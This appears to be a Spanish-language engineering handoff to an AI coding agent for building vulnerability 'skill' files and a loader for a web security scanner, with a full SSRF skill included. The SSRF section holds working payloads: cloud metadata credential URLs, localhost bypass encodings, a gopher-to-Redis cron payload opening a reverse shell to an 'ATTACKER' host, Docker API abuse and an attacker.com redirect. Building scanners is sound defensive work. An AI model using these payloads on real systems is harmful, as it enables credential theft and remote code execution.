# GEMINI HANDOFF: Skills System V1 - Superior a Strix

**Date:** 2026-01-20  
**Priority:** HIGH  
**Estimated Time:** 2-3 hours  
**Scope:** Create specialized knowledge skills for DASTySAST that integrate with our 0-10 scoring system

---

## 🎯 OBJETIVO

Crear un sistema de **Skills especializados** que inyecte conocimiento profundo al DASTySAST Agent. Debe ser **SUPERIOR** al sistema de skills de Strix (<https://github.com/usestrix/strix>) porque:

1. **Integra con nuestro scoring 0-10** - Cada skill tiene guía de puntuación
2. **Sección de falsos positivos detallada** - Para el Skeptical Review
3. **Payloads priorizados por impacto** - High value primero
4. **Context-aware** - Sabe cuándo dar 9/10 vs 5/10

---

## 📁 ESTRUCTURA DE ARCHIVOS A CREAR

```
bugtrace/agents/skills/
├── __init__.py
├── loader.py                    # Carga dinámica de skills
└── vulnerabilities/
    ├── ssrf.md                  # ~10KB
    ├── sqli.md                  # ~10KB  
    ├── xxe.md                   # ~8KB
    ├── xss.md                   # ~8KB
    ├── rce.md                   # ~8KB
    ├── lfi.md                   # ~6KB
    ├── idor.md                  # ~6KB
    └── jwt.md                   # ~6KB
```

---

## 📋 FORMATO DE CADA SKILL

Cada skill debe tener EXACTAMENTE estas secciones en formato Markdown con XML-like tags:

```markdown
# SKILL: [VULNERABILITY_TYPE]

<critical>
Descripción de por qué esta vulnerabilidad es crítica y qué impacto tiene.
</critical>

## 1. SCOPE - Dónde Buscar

<scope>
- Lista de lugares donde buscar esta vulnerabilidad
- Endpoints, parámetros, headers típicos
- Funcionalidades que suelen ser vulnerables
</scope>

## 2. METHODOLOGY - Cómo Atacar

<methodology>
1. Paso 1: Identificar...
2. Paso 2: Probar...
3. Paso 3: Validar...
4. Paso 4: Explotar...
</methodology>

## 3. KNOWLEDGE BASE - Conocimiento Profundo

<knowledge>

### Cloud Metadata Endpoints (si aplica)
- AWS IMDSv1: http://169.254.169.254/latest/meta-data/
- AWS IMDSv2: Requiere token via PUT...
- GCP: http://metadata.google.internal/computeMetadata/v1/ (Header: Metadata-Flavor: Google)
- Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Header: Metadata: true)
- Kubernetes: Kubelet 10250/10255, API Server...

### Bypass Techniques
- Localhost: 127.0.0.1, 127.1, 0x7f000001, 2130706433, ::1
- Protocols: gopher://, dict://, file://, ftp://
- Encoding: URL encode, double encode, Unicode
- Redirects: Open redirect → internal

### Chaining Opportunities
- SSRF → Redis (6379) → RCE via EVAL
- SSRF → Docker API (2375) → Container escape
- SSRF → FastCGI (9000) → PHP RCE

</knowledge>

## 4. SCORING GUIDE - Integración con Sistema 0-10

<scoring_guide>
ESTA SECCIÓN ES CRÍTICA - Define cuándo dar cada puntuación.

| Score | Criterio | Ejemplo |
|-------|----------|---------|
| 9-10 | **CONFIRMED** - Evidencia directa de explotación | OOB callback recibido, metadata leído, archivo exfiltrado |
| 7-8 | **HIGH** - Evidencia clara de vulnerabilidad | Puerto interno responde, DNS resuelve, error específico |
| 5-6 | **MEDIUM** - Indicadores fuertes pero no confirmados | Parámetro procesa URL pero bloqueado, timeout diferente |
| 3-4 | **LOW** - Solo indicadores débiles | Nombre de parámetro (webhook, url), sin evidencia real |
| 0-2 | **REJECT** - Falso positivo claro | URL solo se muestra, client-side fetch, "EXPECTED: SAFE" |

KEYWORDS para scoring automático:
- Score 9+: "callback received", "metadata leaked", "file content", "root:x:0:0"
- Score 7-8: "internal response", "DNS resolved", "connection refused" (interno)
- Score 5-6: "timeout different", "blocked by WAF", "filtered but processed"
- Score 0-2: "display only", "client-side", "EXPECTED: SAFE", "no server request"
</scoring_guide>

## 5. FALSE POSITIVES - Para Skeptical Review

<false_positives>
RECHAZAR INMEDIATAMENTE si se detecta:

1. **Client-side only**: JavaScript fetch, no server-side request
2. **Display only**: URL se muestra en página pero no se procesa
3. **Strict allowlist**: Solo dominios específicos permitidos, sin bypass
4. **Blocked egress**: Todos los targets devuelven el mismo error
5. **Simulators/mocks**: Respuestas canned sin request real
6. **"EXPECTED: SAFE"**: Label explícito en el código/HTML

CUIDADO - NO son falsos positivos:
- "Domain not allowed" → Puede haber bypass
- Timeout → Puede indicar request interno
- Error de conexión → Puede indicar firewall interno
</false_positives>

## 6. PAYLOADS - Priorizados por Impacto

<payloads>

### HIGH VALUE (Probar primero)
```
<http://169.254.169.254/latest/meta-data/iam/security-credentials/>
<http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token>
<http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01>

```

### MEDIUM VALUE
```
<http://127.0.0.1:6379/INFO>
<http://localhost:9200/_cat/indices>
gopher://127.0.0.1:6379/_INFO%0D%0A

```

### LOW VALUE (Confirmación)
```

http://[OOB_CALLBACK]/ssrf-test
<http://127.0.0.1:80/>
file:///etc/passwd

```

</payloads>

## 7. PRO TIPS

<pro_tips>
1. Tip experto 1...
2. Tip experto 2...
3. ...
</pro_tips>
```

---

## 📄 SKILL 1: SSRF (EJEMPLO COMPLETO)

Crea el archivo `bugtrace/agents/skills/vulnerabilities/ssrf.md` con este contenido:

```markdown
# SKILL: SERVER-SIDE REQUEST FORGERY (SSRF)

<critical>
SSRF permite al atacante hacer requests desde el servidor hacia redes internas, cloud metadata, o servicios que no están expuestos públicamente. Puede escalar a RCE via Redis, Docker API, o robo de credenciales cloud.
</critical>

## 1. SCOPE - Dónde Buscar

<scope>
- **Parámetros URL**: url=, link=, src=, href=, redirect=, callback=, webhook=, fetch=, load=, proxy=, image=, avatar=
- **Headers**: X-Forwarded-Host, Origin, Referer (cuando el servidor los procesa)
- **Funcionalidades**: 
  - Link previews (Slack, Discord clones)
  - PDF generators (wkhtmltopdf, Puppeteer)
  - Image processors (ImageMagick, PIL)
  - Webhook testers
  - Import/Export (URL import)
  - OAuth callbacks
  - RSS/Feed parsers
</scope>

## 2. METHODOLOGY

<methodology>
1. **IDENTIFY**: Encontrar todos los parámetros que aceptan URLs o hostnames
2. **BASELINE**: Enviar URL a tu OOB server, confirmar que el SERVER hace el request (no client-side)
3. **INTERNAL**: Probar direcciones internas (127.0.0.1, 169.254.169.254, 10.x.x.x)
4. **BYPASS**: Si hay filtros, probar bypasses (encoding, redirects, DNS rebinding)
5. **ESCALATE**: Si hay acceso interno, probar cloud metadata, Redis, Docker
</methodology>

## 3. KNOWLEDGE BASE

<knowledge>

### Cloud Metadata Endpoints

**AWS EC2:**
- IMDSv1 (legacy): `http://169.254.169.254/latest/meta-data/`
- IMDSv1 credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]`
- IMDSv2 (requiere token):
  ```

  PUT <http://169.254.169.254/latest/api/token>
  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
  → Devuelve TOKEN
  GET <http://169.254.169.254/latest/meta-data/>
  Header: X-aws-ec2-metadata-token: [TOKEN]

  ```
- ECS Task credentials: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`

**GCP:**
- Endpoint: `http://metadata.google.internal/computeMetadata/v1/`
- Header REQUERIDO: `Metadata-Flavor: Google`
- Token: `/instance/service-accounts/default/token`
- Project: `/project/project-id`

**Azure:**
- Endpoint: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- Header REQUERIDO: `Metadata: true`
- MSI Token: `/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`

**Kubernetes:**
- Kubelet (read-only): `http://localhost:10255/pods`
- Kubelet (authenticated): `https://localhost:10250/pods`
- API Server: `https://kubernetes.default.svc/api/v1/namespaces/default/secrets`
- Service Account Token: `/var/run/secrets/kubernetes.io/serviceaccount/token`

### Bypass Techniques

**Localhost variants:**
```

127.0.0.1
127.1
127.0.1
0.0.0.0
0
localhost
[::1]
[::ffff:127.0.0.1]
127.0.0.1.nip.io
2130706433 (decimal)
0x7f000001 (hex)
017700000001 (octal)

```

**Protocol smuggling:**
```

gopher://127.0.0.1:6379/_INFO%0D%0A
dict://127.0.0.1:6379/INFO
file:///etc/passwd
ftp://internal-ftp/

```

**Encoding bypasses:**
```
<http://127.0.0.1> → <http://127%2e0%2e0%2e1>
<http://127.0.0.1> → <http://127。0。0。1> (Unicode dots)
<http://localhost> → http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ (Unicode)

```

**Redirect bypass:**
```
<https://attacker.com/redirect?url=http://169.254.169.254/>

```

**DNS Rebinding:**
```

Dominio que resuelve primero a IP externa, luego a 127.0.0.1

```

### Chaining Opportunities

**SSRF → Redis → RCE:**
```

gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron/%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASET%20x%20"\\n** ** * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\n"%0D%0ASAVE%0D%0A

```

**SSRF → Docker API → RCE:**
```

GET <http://127.0.0.1:2375/containers/json>
POST <http://127.0.0.1:2375/containers/create> (con command malicioso)

```

**SSRF → FastCGI → PHP RCE:**
```

gopher://127.0.0.1:9000/... (FastCGI records crafted)

```

</knowledge>

## 4. SCORING GUIDE

<scoring_guide>

| Score | Criterio | Ejemplo |
|-------|----------|---------|
| **9-10** | OOB callback desde servidor, metadata leído, credenciales obtenidas | "ACCESS_KEY_ID" en respuesta, callback en Interactsh |
| **7-8** | Puerto interno responde diferente, DNS interno resuelve | Connection refused a puerto interno, timeout diferente |
| **5-6** | Request procesado pero bloqueado, error específico de filtro | "Domain not allowed", "Invalid protocol" |
| **3-4** | Solo nombre de parámetro sugiere SSRF, sin evidencia | param=webhook sin test, URL reflejada sin fetch |
| **0-2** | Client-side fetch, display only, lab seguro | JavaScript hace el fetch, "EXPECTED: SAFE" |

**AUTO-SCORING KEYWORDS:**
- 9-10: "AWS_", "ACCESS_KEY", "gcp_credentials", "root:x:0:0", "HTTP callback received"
- 7-8: "Connection refused", "No route to host" (para IPs internas), "Timeout" diferencial
- 5-6: "Domain not allowed", "Blocked", "Invalid scheme"
- 0-2: "display only", "client-side", "EXPECTED: SAFE"

</scoring_guide>

## 5. FALSE POSITIVES

<false_positives>

**RECHAZAR INMEDIATAMENTE:**
1. URL solo se MUESTRA en página sin server fetch
2. JavaScript (client-side) hace el request, no el servidor
3. "EXPECTED: SAFE" en el HTML/código
4. Allowlist estricta sin ningún bypass posible
5. Todos los targets (internos y externos) devuelven exactamente el mismo error
6. Respuesta es claramente mocked/simulada

**NO SON FALSOS POSITIVOS (investigar más):**
- "Domain not allowed" → Puede haber bypass (subdomain, redirect, encoding)
- Timeout → Puede indicar request a red interna lenta
- "Connection refused" → Confirma que el servidor intentó conectar
- Error SSL → El servidor intentó conectar, hay SSRF

</false_positives>

## 6. PAYLOADS

<payloads>

### HIGH VALUE - Cloud Credentials (PROBAR PRIMERO)
```
<http://169.254.169.254/latest/meta-data/iam/security-credentials/>
<http://169.254.169.254/latest/user-data>
<http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token>
<http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/>

```

### MEDIUM VALUE - Internal Services
```
<http://127.0.0.1:6379/INFO>
<http://127.0.0.1:9200/_cat/indices>
<http://127.0.0.1:2375/containers/json>
<http://127.0.0.1:5432/>
<http://localhost:11211/stats>

```

### BYPASS PAYLOADS
```
<http://127.1/>
<http://0x7f000001/>
<http://2130706433/>
http://[::ffff:127.0.0.1]/
<http://127.0.0.1.nip.io/>
<http://foo@127.0.0.1:80/>

```

### CONFIRMATION - OOB
```

http://[INTERACTSH_URL]/ssrf
https://[INTERACTSH_URL]/ssrf-ssl

```

</payloads>

## 7. PRO TIPS

<pro_tips>
1. **OOB primero**: Confirma que el SERVIDOR hace el request, no el browser
2. **IPv6 bypasses**: Muchos WAFs ignoran IPv6 (::ffff:127.0.0.1)
3. **Redirects**: Si hay allowlist, busca open redirect en dominio permitido
4. **IMDSv2**: Si falla IMDSv1, no asumas que no hay SSRF - puede ser IMDSv2
5. **Timing attacks**: Diferencia de tiempo entre IP inexistente vs interna bloqueada
6. **DNS rebinding**: Último recurso para bypasses muy estrictos
7. **Headers propagation**: Si el sink propaga headers, puedes atacar GCP/Azure metadata
8. **Protocols**: gopher:// es tu amigo para Redis/FastCGI/SMTP
</pro_tips>
```

---

## 📄 SKILLS ADICIONALES A CREAR

Crea skills similares para:

1. **sqli.md** - SQL Injection
   - Error-based, blind, time-based, UNION, stacked queries
   - Database-specific payloads (MySQL, PostgreSQL, MSSQL, Oracle)
   - WAF bypasses
   - Scoring: 9-10 = data extracted, 7-8 = error visible, 5-6 = timing difference

2. **xxe.md** - XML External Entity
   - Basic XXE, parameter entities, OOB XXE, XInclude
   - Error-based exfiltration
   - Scoring: 9-10 = file read, 7-8 = OOB callback, 5-6 = parser error

3. **xss.md** - Cross-Site Scripting
   - Reflected, Stored, DOM-based
   - Context-specific payloads (HTML, attribute, JS, URL)
   - CSP bypasses, WAF bypasses
   - Scoring: 9-10 = alert/callback fired, 7-8 = unescaped reflection

4. **rce.md** - Remote Code Execution
   - Command injection, SSTI, deserialization
   - OS-specific payloads
   - Scoring: 9-10 = command output visible, 7-8 = OOB callback

5. **lfi.md** - Local File Inclusion
   - Path traversal, null byte, encoding bypasses
   - Log poisoning, /proc tricks
   - Scoring: 9-10 = file content visible, 7-8 = error reveals path

6. **idor.md** - Insecure Direct Object Reference
   - Horizontal/vertical privilege escalation
   - UUID prediction, parameter tampering
   - Scoring: 7-8 = different user data, 5-6 = id accepts different value

7. **jwt.md** - JWT Vulnerabilities
   - alg:none, weak secrets, key confusion
   - Scoring: 9-10 = auth bypass confirmed

---

## 📄 LOADER.PY - Carga Dinámica

Crea `bugtrace/agents/skills/loader.py`:

```python
"""
Skill Loader for DASTySAST Agent.
Loads specialized knowledge based on detected vulnerability types.
"""

import os
from pathlib import Path
from typing import List, Optional

SKILLS_DIR = Path(__file__).parent / "vulnerabilities"

# Map vulnerability types to skill files
SKILL_MAP = {
    "ssrf": "ssrf.md",
    "server-side request": "ssrf.md",
    "sqli": "sqli.md",
    "sql injection": "sqli.md",
    "sql": "sqli.md",
    "xxe": "xxe.md",
    "xml external": "xxe.md",
    "xss": "xss.md",
    "cross-site scripting": "xss.md",
    "rce": "rce.md",
    "remote code": "rce.md",
    "command injection": "rce.md",
    "lfi": "lfi.md",
    "path traversal": "lfi.md",
    "local file": "lfi.md",
    "idor": "idor.md",
    "insecure direct": "idor.md",
    "jwt": "jwt.md",
    "token": "jwt.md",
}


def get_skill_content(vuln_type: str) -> Optional[str]:
    """
    Load skill content for a specific vulnerability type.
    
    Args:
        vuln_type: The vulnerability type (e.g., "SSRF", "SQL Injection")
    
    Returns:
        The skill markdown content, or None if not found.
    """
    vuln_lower = vuln_type.lower()
    
    for keyword, filename in SKILL_MAP.items():
        if keyword in vuln_lower:
            skill_path = SKILLS_DIR / filename
            if skill_path.exists():
                return skill_path.read_text()
    
    return None


def get_skills_for_findings(findings: List[dict], max_skills: int = 3) -> str:
    """
    Load relevant skills for a list of findings.
    Deduplicates and limits to max_skills to avoid token overload.
    
    Args:
        findings: List of vulnerability findings with 'type' field
        max_skills: Maximum number of skills to include
    
    Returns:
        Combined skill content as a string.
    """
    loaded_skills = set()
    skill_contents = []
    
    for finding in findings:
        vuln_type = finding.get("type", "")
        vuln_lower = vuln_type.lower()
        
        # Find matching skill
        for keyword, filename in SKILL_MAP.items():
            if keyword in vuln_lower and filename not in loaded_skills:
                content = get_skill_content(vuln_type)
                if content:
                    loaded_skills.add(filename)
                    skill_contents.append(content)
                    
                    if len(skill_contents) >= max_skills:
                        break
        
        if len(skill_contents) >= max_skills:
            break
    
    if skill_contents:
        return "\n\n---\n\n".join(skill_contents)
    
    return ""


def get_scoring_guide(vuln_type: str) -> str:
    """
    Extract only the scoring guide section from a skill.
    Useful for the Skeptical Review prompt.
    """
    content = get_skill_content(vuln_type)
    if not content:
        return ""
    
    # Extract <scoring_guide> section
    start = content.find("<scoring_guide>")
    end = content.find("</scoring_guide>")
    
    if start != -1 and end != -1:
        return content[start:end + len("</scoring_guide>")]
    
    return ""


def get_false_positives(vuln_type: str) -> str:
    """
    Extract only the false positives section from a skill.
    Useful for the Skeptical Review prompt.
    """
    content = get_skill_content(vuln_type)
    if not content:
        return ""
    
    # Extract <false_positives> section
    start = content.find("<false_positives>")
    end = content.find("</false_positives>")
    
    if start != -1 and end != -1:
        return content[start:end + len("</false_positives>")]
    
    return ""
```

---

## 🔗 INTEGRACIÓN CON DASTYSAST

Modifica `bugtrace/agents/analysis_agent.py` para usar los skills:

**En el método `_analyze_with_approach` (alrededor de línea 230):**

Añade ANTES del prompt actual:

```python
# Load relevant skills for context enrichment
from bugtrace.agents.skills.loader import get_skills_for_findings

# If we have prior findings, load relevant skills
skill_context = ""
if hasattr(self, '_prior_findings') and self._prior_findings:
    skill_context = get_skills_for_findings(self._prior_findings, max_skills=2)
```

Y añade al prompt:

```python
{f"=== SPECIALIZED KNOWLEDGE ==={chr(10)}{skill_context}{chr(10)}" if skill_context else ""}
```

**En el método `_skeptical_review` (alrededor de línea 360):**

Añade para cada finding:

```python
from bugtrace.agents.skills.loader import get_scoring_guide, get_false_positives

# Build enriched summary with scoring guides
vulns_summary_parts = []
for i, v in enumerate(vulnerabilities):
    vuln_type = v.get('type', 'Unknown')
    scoring_guide = get_scoring_guide(vuln_type)
    fp_guide = get_false_positives(vuln_type)
    
    part = f"""{i+1}. {vuln_type} on '{v.get('parameter')}'
   DASTySAST Score: {v.get('confidence_score', 5)}/10 | Votes: {v.get('votes', 1)}/5
   Reasoning: {v.get('reasoning') or 'No reasoning'}
   
   {scoring_guide[:500] if scoring_guide else ''}
   {fp_guide[:300] if fp_guide else ''}"""
    vulns_summary_parts.append(part)

vulns_summary = "\n\n".join(vulns_summary_parts)
```

---

## ✅ VERIFICACIÓN

Después de implementar:

```bash
# 1. Verificar que los skills se cargan
python3 -c "from bugtrace.agents.skills.loader import get_skill_content; print(len(get_skill_content('SSRF') or ''))"
# Debe imprimir ~10000 (tamaño del skill)

# 2. Verificar scoring guide extraction
python3 -c "from bugtrace.agents.skills.loader import get_scoring_guide; print(get_scoring_guide('SSRF')[:200])"

# 3. Run test against DASTySAST Dojo
python3 testing/dojos/dojo_dastysast.py &
./bugtraceai-cli --clean http://127.0.0.1:5200/ssrf/L5?url=test

# 4. Check logs for skill-enhanced scoring
grep -i "scoring\|skill" logs/execution.log | tail -20
```

---

## ⛔ DO NOT DO

1. ❌ No modifiques los agentes especialistas (XSSAgent, SQLiAgent, etc.)
2. ❌ No cambies el sistema de scoring 0-10 ya implementado
3. ❌ No añadas dependencias nuevas
4. ❌ No crees más de 8 skills inicialmente
5. ❌ No hagas skills de más de 12KB (demasiados tokens)

---

## 📁 FILES SUMMARY

| File | Action | Size |
|------|--------|------|
| `bugtrace/agents/skills/__init__.py` | Create | Empty |
| `bugtrace/agents/skills/loader.py` | Create | ~2KB |
| `bugtrace/agents/skills/vulnerabilities/ssrf.md` | Create | ~10KB |
| `bugtrace/agents/skills/vulnerabilities/sqli.md` | Create | ~10KB |
| `bugtrace/agents/skills/vulnerabilities/xxe.md` | Create | ~8KB |
| `bugtrace/agents/skills/vulnerabilities/xss.md` | Create | ~8KB |
| `bugtrace/agents/skills/vulnerabilities/rce.md` | Create | ~8KB |
| `bugtrace/agents/skills/vulnerabilities/lfi.md` | Create | ~6KB |
| `bugtrace/agents/skills/vulnerabilities/idor.md` | Create | ~6KB |
| `bugtrace/agents/skills/vulnerabilities/jwt.md` | Create | ~6KB |
| `bugtrace/agents/analysis_agent.py` | Modify | Add skill loading |

---

## 🎯 SUCCESS CRITERIA

1. ✅ Skills cargan correctamente desde archivos .md
2. ✅ get_skill_content("SSRF") devuelve ~10KB de contenido
3. ✅ get_scoring_guide() extrae solo la sección de scoring
4. ✅ get_false_positives() extrae la sección de FP
5. ✅ DASTySAST incluye skill en su análisis
6. ✅ Skeptical Review usa scoring guide específico por tipo
7. ✅ Logs muestran scoring más preciso

---

## 🏆 POR QUÉ SOMOS SUPERIORES A STRIX

| Aspecto | Strix | BugTraceAI |
|---------|-------|------------|
| Conocimiento | ~8KB genérico | ~10KB con scoring integrado |
| Scoring Guide | ❌ No tiene | ✅ Por cada tipo |
| False Positives | Básico | ✅ Detallado para Skeptical |
| Payloads | Lista plana | ✅ Priorizados (high/medium/low) |
| Integración | Inyecta a prompt | ✅ Integrado con 0-10 scoring |
| Validación | ❓ No claro | ✅ 4 niveles (DASTySAST → Skeptical → Specialist → AgenticValidator) |
